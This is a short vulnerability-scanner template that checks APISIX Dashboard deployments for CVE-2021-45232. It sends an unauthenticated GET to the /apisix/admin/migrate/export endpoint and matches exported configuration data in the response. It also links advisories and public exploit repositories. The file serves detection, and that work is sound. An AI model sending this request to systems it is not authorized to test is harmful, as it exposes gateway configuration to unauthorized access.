name: Apache APISIX Dashboard API Unauthorized Access CVE-2021-45232
manual: true
query: title="Apache APISIX Dashboard"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /apisix/admin/migrate/export
    expression: response.status == 200 && response.body.bcontains(b"Consumers\":[],\"Routes\":")
      && response.body.bcontains(b"PluginConfigs\":")
expression: r0()
detail:
  links:
  - https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/
  - https://github.com/pingpongcult/CVE-2021-45232
  - https://github.com/advisories/GHSA-wcxq-f256-53xp
  - https://twitter.com/403Timeout/status/1475715079173976066
  - https://github.com/wuppp/cve-2021-45232-exp
  - https://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247487772&idx=2&sn=09b6c93b14f10f4cb41aecc94ce71c75
  description: The Apache APISIX Dashboard is designed to make it as easy as possible
    for users to operate Apache APISIX through a frontend interface.
  tags: unauthorizedaccess
